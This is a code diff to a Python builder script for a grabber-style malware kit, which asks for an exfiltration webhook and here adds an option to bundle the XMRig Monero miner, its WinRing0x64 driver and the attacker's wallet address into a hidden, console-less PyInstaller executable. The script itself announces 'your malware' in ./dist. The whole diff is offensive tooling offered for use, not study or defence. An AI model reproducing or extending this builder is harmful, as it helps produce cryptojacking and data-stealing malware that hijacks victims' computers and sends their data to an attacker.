@@ -329,8 +329,17 @@ try:
       filename= input("Name of the file: ")
       os.rename("./build/CODE.py", f"./build/{filename}.py")
       webhook_to_cfg = input("webhook: ")
+      miner_to_cfg= input("Do you wanna include miner? [yes/no]: ")
+      if miner_to_cfg.lower() == "yes":
+        miner_to_cfg = True
+        addrs = input("Monero Wallet Address?: ")
+      elif miner_to_cfg.lower() == "no":
+        miner_to_cfg = False
+        addrs = None
       webhook_cfg = {
-        "WEBHOOK":webhook_to_cfg
+        "WEBHOOK":webhook_to_cfg,
+        "MINER":miner_to_cfg,
+        "WALLET":addrs
       }
       webhook_ready = json.dumps(webhook_cfg)
       with open("./build/CONFIG.json","w") as f:
@@ -338,10 +347,11 @@ try:
         f.close()
       if platform.system() == "Windows":
         import PyInstaller.__main__
-        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json;.","--clean","--workpath=./build/","--noconsole"])
+        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json;.", "--add-data=./grabber-utils/xmrig.exe;.", "--add-data=./grabber-utils/WinRing0x64.sys;.","--clean","--workpath=./build/","--noconsole"])
       else:
         import PyInstaller.__main__
-        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.","--clean","--workpath=./build/"])
+        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.", "--add-data=./grabber-utils/xmrig:.","--clean","--workpath=./build/"])
+      print(f"You will find your malware inside ./dist/{filename}")
     elif choice == 99:
         Write.Print(f'''
       ██╗███████╗ ██████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
